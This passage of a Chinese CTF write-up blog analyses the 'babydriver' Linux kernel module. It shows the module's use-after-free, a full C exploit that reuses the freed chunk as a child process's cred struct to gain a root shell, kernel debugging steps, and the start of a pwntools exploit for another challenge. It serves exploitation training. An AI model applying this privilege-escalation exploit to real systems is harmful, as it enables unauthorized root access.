    kernel_cap_t    cap_permitted<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* caps we're permitted */</span>
    kernel_cap_t    cap_effective<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* caps we can actually use */</span>
    kernel_cap_t    cap_bset<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* capability bounding set */</span>
    kernel_cap_t    cap_ambient<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Ambient capability set */</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> CONFIG_KEYS</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>   jit_keyring<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* default keyring to attach requested * keys to */</span>
    <span class="token keyword">struct</span> key __rcu <span class="token operator">*</span>session_keyring<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* keyring inherited over fork */</span>
    <span class="token keyword">struct</span> key  <span class="token operator">*</span>process_keyring<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* keyring private to this process */</span>
    <span class="token keyword">struct</span> key  <span class="token operator">*</span>thread_keyring<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* keyring private to this thread */</span>
    <span class="token keyword">struct</span> key  <span class="token operator">*</span>request_key_auth<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* assumed request_key authority */</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> CONFIG_SECURITY</span>
    <span class="token keyword">void</span>        <span class="token operator">*</span>security<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* subjective LSM security */</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
    <span class="token keyword">struct</span> user_struct <span class="token operator">*</span>user<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* real user ID subscription */</span>
    <span class="token keyword">struct</span> user_namespace <span class="token operator">*</span>user_ns<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* user_ns the caps and keyrings are relative to. */</span>
    <span class="token keyword">struct</span> group_info <span class="token operator">*</span>group_info<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* supplementary groups for euid/fsgid */</span>
    <span class="token keyword">struct</span> rcu_head rcu<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* RCU deletion hook */</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>当我们是root权限的时候,我们的uid是等于0的,另外此版本的cred的大小是0xa8;</p>
<h3 id="SLAB-amp-SLUB"><a href="#SLAB-amp-SLUB" class="headerlink" title="SLAB &amp; SLUB"></a>SLAB &amp; SLUB</h3><p>  kernel中没有libc，但是仍然需要内存的分配和释放，这时就会使用到kmalloc&amp;kfree  API（相当于用户态使用的malloc&amp;free）。kmalloc&amp;kfree的实现是通过SLAB或SLUB分配器，现在一般是SLUB分配器。分配器是通过一个多级的结构进行管理。首先有cache层，cache是一个结构，其中保存的对象分为空对象、部分使用的对象和完全使用的对象进行管理。对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。kmalloc使用了多个cache，每个cache对应一个2的幂次大小的一组内存对象。</p>
<p>  SLAB和SLUB都是内核的内存管理机制。为了提高效率，SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配。但是SLAB比较严格，需要再次申请的数据类型和大小与原先的完全一样，并且不同cache的无法分在同一页内；而SLUB较为宽松，和堆分配机制更为相似。</p>
<h2 id="设备程序分析"><a href="#设备程序分析" class="headerlink" title="设备程序分析"></a>设备程序分析</h2><p>驱动中存在一个结构体</p>
<pre><code>struct babydev_struct&#123;
    char *device_buf;
    size_t device_buf_len;
&#125;;</code></pre>
<h3 id="babyopen函数"><a href="#babyopen函数" class="headerlink" title="babyopen函数"></a>babyopen函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">babyopen</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>

  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">//对babydev_struct.device_buf 进行开辟一个0x40大小的内存</span>
  babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">,</span> <span class="token number">0x40LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">0x40LL</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device open\n"</span><span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="babywrite函数"><a href="#babywrite函数" class="headerlink" title="babywrite函数"></a>babywrite函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">babywrite</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t length<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>offset<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>

  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>
      <span class="token function">copy_from_user</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 从用户空间拷贝数据到babydev_struct.device_buf</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="babyread-函数"><a href="#babyread-函数" class="headerlink" title="babyread 函数"></a>babyread 函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">babyread</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t length<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>offset<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>

  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>
      <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//从内核中拷贝数据到用户空间</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="babyioctrl函数"><a href="#babyioctrl函数" class="headerlink" title="babyioctrl函数"></a>babyioctrl函数</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// local variable allocation has failed, the output may be wrong!</span>
<span class="token keyword">void</span> __fastcall <span class="token function">babyioctl</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> command<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 arg<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>
  size_t v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>

  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> command <span class="token operator">==</span> <span class="token number">0x10001</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_kmalloc</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 根据用户来控制开辟内存空间的大小</span>
    babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> v4<span class="token punctuation">;</span>
    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"alloc done\n"</span><span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"\x013defalut:arg is %ld\n"</span><span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="babyrelease函数"><a href="#babyrelease函数" class="headerlink" title="babyrelease函数"></a>babyrelease函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">babyrelease</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>

  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// 释放babydev_struct.device_buf, 对指针没有清0, 造成uaf漏洞</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device release\n"</span><span class="token punctuation">,</span> filp<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><p>这个从用户态的pwn来看好像漏洞并不明显,但是我们现在是在内核态了,要把用户态的单线程的思维抛开了,从多线程的角度来思考。</p>
<ol>
<li>首先打开两次设备，通过ioctl将babydev_struct大小为的cred结构体的大小(不同版本kernel的可能不一样,需要通过源码去算);</li>
<li>然后释放其中一个设备，fork出一个新进程，此时这个新进程的cred 的空间就会重新开辟, 然而系统就会把之前大小一样空闲内存空间分配给它,。</li>
<li>第二个打开的文件描述符对这块空间进行写操作，只需要将uid和gid改为0，实现root提权</li>
</ol>
<h2 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h2><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">// gcc exp.c -o exp -static -w</span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// vul: uaf</span>
        <span class="token keyword">int</span> fd_1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> fd_2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//babydev_struct.device_buf 记录的是 fd_2</span>
        pid_t pid<span class="token punctuation">;</span>
        <span class="token function">ioctl</span><span class="token punctuation">(</span>fd_1<span class="token punctuation">,</span> <span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 开辟0xa8的内核空间, 命名为chunk1吧</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">==</span> fd_1 <span class="token operator">||</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">==</span> fd_2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"open babydev failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">close</span><span class="token punctuation">(</span>fd_1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 关闭fd_1, ioctl所开辟的0xa8空间, 释放掉chunk1内存,</span>
        pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// fork 时有点类似与malloc中的fastbin原理, 子进程开辟cred内存的时候, 先遍历大小合适的空闲内存, 然后直接分配</span>
        <span class="token comment" spellcheck="true">// child process</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
                <span class="token function">write</span><span class="token punctuation">(</span>fd_2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//向释放掉的chunk1内存中填充60个0, 然而也是该进程的cred结构体,使uid和gid为0, 提权为root</span>
                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//运行子进程时会继承父进程的权限</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="提取vmlinux"><a href="#提取vmlinux" class="headerlink" title="提取vmlinux"></a>提取vmlinux</h3><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本如下:</p>
<pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token comment" spellcheck="true"># SPDX-License-Identifier: GPL-2.0-only</span>
<span class="token comment" spellcheck="true"># ----------------------------------------------------------------------</span>
<span class="token comment" spellcheck="true"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span>
<span class="token comment" spellcheck="true">#</span>
<span class="token comment" spellcheck="true"># Inspired from extract-ikconfig</span>
<span class="token comment" spellcheck="true"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net></span>
<span class="token comment" spellcheck="true">#</span>
<span class="token comment" spellcheck="true"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com></span>
<span class="token comment" spellcheck="true">#</span>
<span class="token comment" spellcheck="true"># ----------------------------------------------------------------------</span>

check_vmlinux<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true"># Use readelf to check if it's a valid ELF</span>
    <span class="token comment" spellcheck="true"># TODO: find a better to way to check that it's really vmlinux</span>
    <span class="token comment" spellcheck="true">#       and not just an elf</span>
    readelf -h <span class="token variable">$1</span> <span class="token operator">></span> /dev/null 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">||</span> <span class="token keyword">return</span> 1

    <span class="token function">cat</span> <span class="token variable">$1</span>
    <span class="token keyword">exit</span> 0
<span class="token punctuation">}</span>

try_decompress<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true"># The obscure use of the "tr" filter is to work around older versions of</span>
    <span class="token comment" spellcheck="true"># "grep" that report the byte offset of the line instead of the pattern.</span>

    <span class="token comment" spellcheck="true"># Try to find the header ($1) and decompress from here</span>
    <span class="token keyword">for</span>    pos <span class="token keyword">in</span> `tr <span class="token string">"<span class="token variable">$1</span>\n<span class="token variable">$2</span>"</span> <span class="token string">"\n<span class="token variable">$2</span>="</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$img</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> -abo <span class="token string">"^<span class="token variable">$2</span>"</span>`
    <span class="token keyword">do</span>
        pos<span class="token operator">=</span><span class="token variable">${pos%%:*}</span>
        <span class="token function">tail</span> -c+<span class="token variable">$pos</span> <span class="token string">"<span class="token variable">$img</span>"</span> <span class="token operator">|</span> <span class="token variable">$3</span> <span class="token operator">></span> <span class="token variable">$tmp</span> 2<span class="token operator">></span> /dev/null
        check_vmlinux <span class="token variable">$tmp</span>
    <span class="token keyword">done</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true"># Check invocation:</span>
me<span class="token operator">=</span>$<span class="token punctuation">{</span>0<span class="token comment" spellcheck="true">##*/}</span>
img<span class="token operator">=</span><span class="token variable">$1</span>
<span class="token keyword">if</span>    <span class="token punctuation">[</span> $<span class="token comment" spellcheck="true"># -ne 1 -o ! -s "$img" ]</span>
<span class="token keyword">then</span>
    <span class="token keyword">echo</span> <span class="token string">"Usage: <span class="token variable">$me</span> &lt;kernel-image>"</span> <span class="token operator">></span><span class="token operator">&amp;</span>2
    <span class="token keyword">exit</span> 2
<span class="token keyword">fi</span>

<span class="token comment" spellcheck="true"># Prepare temp files:</span>
tmp<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp /tmp/vmlinux-XXX<span class="token variable">)</span></span>
<span class="token function">trap</span> <span class="token string">"rm -f <span class="token variable">$tmp</span>"</span> 0

<span class="token comment" spellcheck="true"># That didn't work, so retry after decompression.</span>
try_decompress <span class="token string">'\037\213\010'</span> xy    gunzip
try_decompress <span class="token string">'\3757zXZ\000'</span> abcde unxz
try_decompress <span class="token string">'BZh'</span>          xy    bunzip2
try_decompress <span class="token string">'\135\0\0\0'</span>   xxx   unlzma
try_decompress <span class="token string">'\211\114\132'</span> xy    <span class="token string">'lzop -d'</span>
try_decompress <span class="token string">'\002!L\030'</span>   xxx   <span class="token string">'lz4 -d'</span>
try_decompress <span class="token string">'(\265/\375'</span>   xxx   unzstd

<span class="token comment" spellcheck="true"># Finally check for uncompressed images or objects:</span>
check_vmlinux <span class="token variable">$img</span>

<span class="token comment" spellcheck="true"># Bail out:</span>
<span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$me</span>: Cannot find vmlinux."</span> <span class="token operator">></span><span class="token operator">&amp;</span>2</code></pre>
<p>保存为extract-vmlinux</p>
<p>提取vmlinux, 方便调试</p>
<pre><code>./extract-vmlinux ./bzImage &gt; vmlinux</code></pre>
<h3 id="启动gdb"><a href="#启动gdb" class="headerlink" title="启动gdb"></a>启动gdb</h3><pre><code>gdb ./vmlinux -q</code></pre>
<h3 id="启动boot-sh获取babydriver的加载基址"><a href="#启动boot-sh获取babydriver的加载基址" class="headerlink" title="启动boot.sh获取babydriver的加载基址"></a>启动boot.sh获取babydriver的加载基址</h3><p>使用 cat /proc/moudles或者lsmod</p>
<pre><code>/ # lsmod
babydriver 16384 2 - Live 0xffffffffc0000000 (OE)</code></pre>
<h3 id="导入符号表"><a href="#导入符号表" class="headerlink" title="导入符号表"></a>导入符号表</h3><p>最后面填写babydriver的基址</p>
<pre><code>add-symbol-file ./fs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</code></pre>
<h3 id="调试qumu"><a href="#调试qumu" class="headerlink" title="调试qumu"></a>调试qumu</h3><p>在boot.sh中添加参数如下:</p>
<pre><code>-gdb tcp::9999</code></pre>
<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>运行程序</p>
<pre><code>./boot.sh</code></pre>
<p>在gdb中连接该qemu程序</p>
<pre><code>target remote 127.0.0.1:9999</code></pre>
<p>运行如图</p>
<p><img src="/images/wp-babydriver-1.png"></p>
<p>先下个断点</p>
<p><img src="/images/wp-babydriver-2.png"></p>
<p>那么就和平时调试差不多了,只是调试相对比较慢而已, 下面就不演示了…</p>
<h1 id="太湖杯-2020"><a href="#太湖杯-2020" class="headerlink" title="太湖杯 2020"></a>太湖杯 2020</h1><h2 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: i0gan</span>
<span class="token comment" spellcheck="true"># Env: Linux arch 5.8.14-arch1-1</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>


context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

elf_path  <span class="token operator">=</span> <span class="token string">'pwn'</span>
MODIFY_LD <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token string">'64'</span>
libc_v <span class="token operator">=</span> <span class="token string">'2.29'</span>

ld_path   <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/ld-linux-x86-64.so.2'</span>
libs_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib'</span>
libc_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'./libc.so.6'</span>

<span class="token comment" spellcheck="true"># change ld path </span>
<span class="token keyword">if</span><span class="token punctuation">(</span>MODIFY_LD<span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cp '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">'.bk'</span><span class="token punctuation">)</span>
    change_ld_cmd <span class="token operator">=</span> <span class="token string">'patchelf  --set-interpreter '</span> <span class="token operator">+</span> ld_path <span class="token operator">+</span><span class="token string">' '</span> <span class="token operator">+</span> elf_path
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>change_ld_cmd<span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'modify ld ok!'</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"119.3.89.93"</span>
server_port <span class="token operator">=</span> <span class="token number">8014</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>


<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> sz<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'ce:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
